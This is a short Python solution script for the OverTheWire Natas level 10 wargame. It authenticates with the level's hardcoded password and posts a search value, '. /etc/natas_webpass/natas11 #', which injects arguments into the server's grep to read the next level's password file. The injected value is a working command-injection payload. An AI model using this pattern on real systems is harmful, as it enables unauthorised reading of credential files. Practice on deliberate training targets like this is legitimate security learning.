#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = f'http://{username}.natas.labs.overthewire.org/'

# response = requests.get(url + 'index-source.html', auth=(username, password))
response = requests.post(url, data={
                         'needle': '. /etc/natas_webpass/natas11 #', 'submit': 'submit'}, auth=(username, password))
content = response.text
output = open('output.html', 'w')
output.write(content)

print(content)
# print(re.findall('<pre>\n(.*)\n</pre>', content))

# Remote Code Execution
